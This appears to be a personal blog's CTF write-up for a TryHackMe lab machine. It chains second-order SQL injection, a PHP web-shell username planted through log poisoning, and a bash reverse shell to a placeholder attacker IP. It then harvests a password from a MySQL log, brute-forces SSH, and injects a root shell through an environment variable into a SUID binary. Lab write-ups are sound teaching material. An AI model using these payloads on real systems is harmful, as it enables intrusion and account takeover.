@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WWBuddy — SQLi to Env-Var Privesc — writeup · 0xmrerror</title>
+  <meta name="description" content="A half-built &#x27;make friends&#x27; site with SQLi in the signup flow, and an environment-variable leak that turns a web foothold into sudo." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/ww-buddy/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="WWBuddy — SQLi to Env-Var Privesc — writeup · 0xmrerror" />
+  <meta property="og:description" content="A half-built &#x27;make friends&#x27; site with SQLi in the signup flow, and an environment-variable leak that turns a web foothold into sudo." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/ww-buddy/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="WWBuddy — SQLi to Env-Var Privesc — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="A half-built &#x27;make friends&#x27; site with SQLi in the signup flow, and an environment-variable leak that turns a web foothold into sudo." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "WWBuddy \u2014 SQLi to Env-Var Privesc",
+    "description": "A half-built 'make friends' site with SQLi in the signup flow, and an environment-variable leak that turns a web foothold into sudo.",
+    "url": "https://0xmrerror.me/writeups/ww-buddy/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, sqli, flask, environment-variables, privilege-escalation, django",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>WWBuddy — SQLi to Env-Var Privesc</h1>
+      <p class="wu-summary">A half-built &#x27;make friends&#x27; site with SQLi in the signup flow, and an environment-variable leak that turns a web foothold into sudo.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 20 min read</span><a class="tag" href="/?type=web#writeups">sqli</a><a class="tag" href="/?type=web#writeups">flask</a><a class="tag" href="/?type=web#writeups">environment-variables</a><a class="tag" href="/?type=web#writeups">privilege-escalation</a><a class="tag" href="/?type=web#writeups">django</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/">Mr Robot CTF</a><a href="/writeups/ww-buddy/" class="is-current">WWBuddy</a><a href="/writeups/broker/">Broker</a><a href="/writeups/watcher/">Watcher</a><a href="/writeups/fortress/">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<p>A "make friends" site still in development. The chain: a second-order SQL injection resets every password, an unsanitized username poisons an admin log into a PHP shell, a MySQL log leaks a password, and a SUID binary trusts the <code>USER</code> env var. Goal: 3 flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># Map the room IP to a hostname</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x wwbuddy.thm</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-comment"># Port scan</span>
+<span class="tok-func">nmap</span> -sV -sC wwbuddy.thm
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh
+80/tcp open  http   Apache
+
+<span class="tok-comment"># Directory enum</span>
+<span class="tok-func">gobuster</span> dir -u http://wwbuddy.thm/ -w /usr/share/wordlists/common.txt
+
+/admin  /api  /register  /login  /profile</code></pre>
+
+<h3>2 · Second-Order SQLi — Reset Everyone's Password</h3>
+<p>The username is stored unsanitized and later reused inside a raw <code>UPDATE</code> query when you change your own password. Inject a username that makes the <code>WHERE</code> clause match every row — now all passwords become yours.</p>
+<pre><code><span class="tok-comment"># 1) Register, then set your username to</span>
+<span class="tok-keyword">' or 1=1-- -</span>
+
+<span class="tok-comment"># 2) Change your password to a known value, e.g. adminadmin</span>
+
+<span class="tok-comment"># 3) The backend effectively runs</span>
+UPDATE users SET password = <span class="tok-string">'adminadmin'</span>
+WHERE old_password = users.old_password
+  AND username = <span class="tok-string">''</span> OR <span class="tok-num">1</span>=<span class="tok-num">1</span>-- -
+
+<span class="tok-comment"># 4) Login as any known user — password is now adminadmin</span>
+WWBuddy : adminadmin</code></pre>
+
+<h3>3 · Log Poisoning → RCE</h3>
+<p>Login as <code>WWBuddy</code> and plant a PHP one-liner as the username. Then log in as <code>Henry</code>, the account allowed into <code>/admin</code> — the dashboard prints every visitor's username unsanitized, so the payload is executed and a <code>cmd</code> parameter appears.</p>
+<pre><code><span class="tok-comment"># Username to plant</span>
+<span class="tok-string">&lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="tok-comment"># Run commands through /admin</span>
+http://wwbuddy.thm/admin/?cmd=<span class="tok-func">id</span>
+uid=<span class="tok-num">33</span>(www-data) gid=<span class="tok-num">33</span>(www-data)
+
+<span class="tok-comment"># Reverse shell — URL-encode this and pass it to cmd</span>
+<span class="tok-func">bash</span> -i &gt;&amp; /dev/tcp/<span class="tok-string">ATTACK_IP</span>/<span class="tok-num">4444</span> <span class="tok-num">0</span>&gt;&amp;<span class="tok-num">1</span>
+
+<span class="tok-comment"># Attacker listener</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span></code></pre>
+
+<h3>4 · www-data → roberto (MySQL log leak)</h3>
+<p>Run <code>linpeas</code>. It surfaces <code>/var/log/mysql/general.log</code>, which records every query — including roberto typing his password into the username box by accident.</p>
+<pre><code><span class="tok-func">grep</span> -i roberto /var/log/mysql/general.log
+<span class="tok-comment"># &gt; roberto : &lt;password&gt;</span>
+
+<span class="tok-func">ssh</span> roberto@wwbuddy.thm
+<span class="tok-comment"># user flag</span>
+<span class="tok-func">cat</span> /home/roberto/importante.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+<p><code>importante.txt</code> is in Portuguese (Roberto is Brazilian): "Jenny turns 26 next week". The web app uses <code>mm/dd/yyyy</code> as default passwords.</p>
+
+<h3>5 · roberto → jenny (birthday bruteforce)</h3>
+<pre><code><span class="tok-comment"># File modified ~Jul 27 2020 → Jenny's birthday in 08/01–08/09/1994</span>
+<span class="tok-func">stat</span> /home/roberto/importante.txt | <span class="tok-func">grep</span> Modify
+
+<span class="tok-comment"># Wordlist of candidate mm/dd/yyyy dates</span>
+<span class="tok-func">seq</span> <span class="tok-num">1</span> <span class="tok-num">9</span> | <span class="tok-func">awk</span> <span class="tok-string">'{printf "08/0%d/1994\n", $1}'</span> &gt; datelist.txt
+
+<span class="tok-func">hydra</span> -l jenny -P datelist.txt wwbuddy.thm ssh
+<span class="tok-func">ssh</span> jenny@wwbuddy.thm</code></pre>
+
+<h3>6 · jenny → root (SUID + env injection)</h3>
+<p><code>/bin/authenticate</code> is SUID-root. Reversing it (Ghidra) shows it builds <code>usermod -G developer &lt;name&gt;</code> from the <code>USER</code> env var and feeds it to <code>system()</code> — so the var itself becomes our injection point.</p>
+<pre><code><span class="tok-comment"># Spot the unusual SUID binary</span>
+<span class="tok-func">find</span> / -type f -perm -4000 2&gt;/dev/null
+/bin/authenticate   <span class="tok-comment"># SUID, owned by root</span>
+
+<span class="tok-comment"># Inject a shell through the env var</span>
+<span class="tok-func">export</span> USER=<span class="tok-string">"jenny; bash"</span>
+/bin/authenticate
+
+<span class="tok-comment"># root shell — read the flag</span>
+root@wwbuddy:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: second-order SQLi password reset → log-poisoned PHP shell → MySQL log credential leak → birthday bruteforce → SUID env-var injection. Lessons: sanitize every place a username is reused, keep MySQL's general log off, and never trust environment variables in SUID binaries.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      <a class="prev" href="/writeups/mr-robot/"><small>← previous</small><span>Mr Robot CTF — WordPress to Root</span></a>
+      <a class="next" href="/writeups/broker/"><small>next →</small><span>Broker — MQTT Eavesdrop to Webshell</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
